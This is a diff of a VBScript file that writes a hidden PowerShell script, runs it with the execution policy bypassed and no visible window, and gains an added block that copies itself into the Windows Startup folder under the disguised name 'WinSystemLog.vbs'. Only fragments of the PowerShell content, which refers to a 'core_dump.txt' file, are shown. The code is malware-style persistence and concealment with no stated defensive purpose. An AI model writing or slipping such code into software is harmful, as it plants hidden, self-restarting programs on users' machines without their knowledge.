@@ -10,6 +10,14 @@ WshShell.Run "attrib -s -h -r " & Chr(34) & psPath & Chr(34), 0, True
 fso.DeleteFile psPath, True
 On Error GoTo 0
 
+Set fso = CreateObject("Scripting.FileSystemObject")
+strStartupFolder = CreateObject("WScript.Shell").SpecialFolders("Startup")
+strDestination = strStartupFolder & "\WinSystemLog.vbs"
+
+If Not fso.FileExists(strDestination) Then
+    fso.CopyFile WScript.ScriptFullName, strDestination, True
+End If
+
 Set psFile = fso.CreateTextFile(psPath, True)
 psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
 psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
@@ -25,5 +33,6 @@ psFile.Close
 
 fso.GetFile(psPath).Attributes = 2 + 4
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
+
 
 
